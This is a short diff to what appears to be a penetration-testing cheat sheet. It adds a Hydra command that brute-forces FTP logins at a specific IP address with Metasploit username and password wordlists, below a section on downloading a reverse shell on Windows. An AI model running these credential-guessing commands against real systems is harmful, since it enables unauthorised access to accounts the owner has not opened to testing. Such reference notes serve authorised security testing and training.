@@ -195,9 +195,14 @@ __Download the reverse shell in windows__
 
 
 - ## Brute-force attack <a name="bruteforce"></a>
+
+
 ### Hydra FTP Brute Force
 ```
 hydra -l admin -P /usr/share/wordlists/fasttrack.txt 127.0.0.1 ftp
+```
+```
+hydra -L/usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.198.30.3 -t 4 ftp
 ```
 ### Hydra POP3 Brute Force
 ```
